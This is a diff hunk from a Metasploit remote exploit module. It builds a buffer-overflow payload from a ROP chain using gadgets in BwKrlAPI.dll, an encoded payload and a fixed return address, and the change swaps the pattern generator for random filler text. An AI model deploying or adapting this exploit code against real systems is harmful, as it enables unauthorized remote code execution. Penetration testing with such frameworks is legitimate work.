@@ -101,7 +101,7 @@ class MetasploitModule < Msf::Exploit::Remote
       0x02037c7c,  # PUSHAD # RETN [BwKrlAPI.dll] 
     ].flatten.pack("V*")
 
-  data = pattern_create(5024)
+  data = rand_text_alpha_upper(5024)
   data[264, ropnop.size] = ropnop
   data[312, rop.size + payload.encoded.size] = rop + payload.encoded
   data[1868, 4] = [0x07033fa8].pack('V')
